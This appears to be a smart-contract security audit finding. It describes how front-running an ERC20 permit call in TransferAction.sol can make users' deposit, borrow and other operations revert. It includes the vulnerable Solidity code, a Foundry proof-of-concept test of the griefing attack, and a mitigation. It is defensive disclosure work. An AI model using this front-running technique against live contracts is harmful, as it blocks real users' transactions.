# Vulnerability details

## Impact

The `PERMIT` approvalType in the `TransferAction.sol` contract allows users to delegate the transfer of tokens on their behalf. However, this feature can be exploited by an attacker who front-runs a legitimate transaction. By calling the `safePermit` function before the legitimate user's transaction is executed, the attacker can cause the user's transaction to revert. This is because the `safePermit` function is executed before the legitimate user's transaction, leading to a state change that causes the user's transaction to fail.


```solidity
    function _transferFrom(
        address token,
        address from,
        address to,
        uint256 amount,
        PermitParams memory params
    ) internal {
        if (params.approvalType == ApprovalType.PERMIT2) {
            // Consume a permit2 message and transfer tokens.
            ISignatureTransfer(permit2).permitTransferFrom(
                ISignatureTransfer.PermitTransferFrom({
                    permitted: ISignatureTransfer.TokenPermissions({token: token, amount: params.approvalAmount}),
                    nonce: params.nonce,
                    deadline: params.deadline
                }),
                ISignatureTransfer.SignatureTransferDetails({to: to, requestedAmount: amount}),
                from,
                bytes.concat(params.r, params.s, bytes1(params.v)) // Construct signature
            );
        } else if (params.approvalType == ApprovalType.PERMIT) {
            // Consume a standard ERC20 permit message
>>>         IERC20Permit(token).safePermit(
                from,
                to,
                params.approvalAmount,
                params.deadline,
                params.v,
                params.r,
                params.s
            );
>>>         IERC20(token).safeTransferFrom(from, to, amount);
        } else {
            // No signature provided, just transfer tokens.
            IERC20(token).safeTransferFrom(from, to, amount);
        }
    }
```

In the `TransferAction.sol` contract, the `safePermit` function is invoked in various parts of the `PositionAction.sol` contract to perform `deposit`, `borrow`, `withdraw`, `repay`, and `leverage` actions. If an attacker front-runs the transaction with a `permit` operation, it can temporarily block these operations when they use `PERMIT` approvals. Consequently, the user must execute the operation again without `approvalType == PERMIT` to complete the transaction. It is important to note that the token transfer occurs right after executing the permit, which means that this transfer does not take place until the caller rearranges to call `safeTransferFrom` again without using the permit. [More info](https://www.trust-security.xyz/post/permission-denied).

## Proof of Concept

The following test demonstrates how an attacker can front-run a legitimate user by executing `safePermit` before the user's transaction, causing the legitimate user's transaction to revert:

```solidity
    function test_permit_transferFrom_frontrun() public {
        uint256 amount = 100 * 1e6;
        uint256 nonce = USDC.nonces(user);
        uint256 deadline = block.timestamp + 100;
        deal(address(USDC), address(user), amount);
        (uint8 v, bytes32 r, bytes32 s) = PermitMaker.getPermitTransferFromSignature(
            address(USDC),
            address(userProxy),
            amount,
            nonce,
            deadline,
            userPk
        );
        PermitParams memory params = PermitParams({
            approvalType: ApprovalType.PERMIT,
            approvalAmount: amount,
            nonce: nonce,
            deadline: deadline,
            v: v,
            r: r,
            s: s
        });
        //
        // 1. Attacker frontrun the legitimate user transaction
        vm.prank(address(0xb0b));
        USDC.safePermit(
            address(user),
            address(userProxy),
            params.approvalAmount,
            params.deadline,
            params.v,
            params.r,
            params.s
        );
        //
        // 2. Legitimate user transaction is reverted
        vm.expectRevert("EIP2612: invalid signature");
        vm.prank(user);
        userProxy.execute(
            address(wrapper),
            abi.encodeWithSelector(
                wrapper.transferFrom.selector,
                USDC,
                address(user),
                address(userProxy),
                amount,
                params
            )
        );
    }
```

## Recommended Mitigation Steps

It is recommended to manage the failure in the execution of `safePermit` as advised by [OpenZeppelin](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#security_considerations), in order to proceed with the execution of `safeTransfer` without issues.
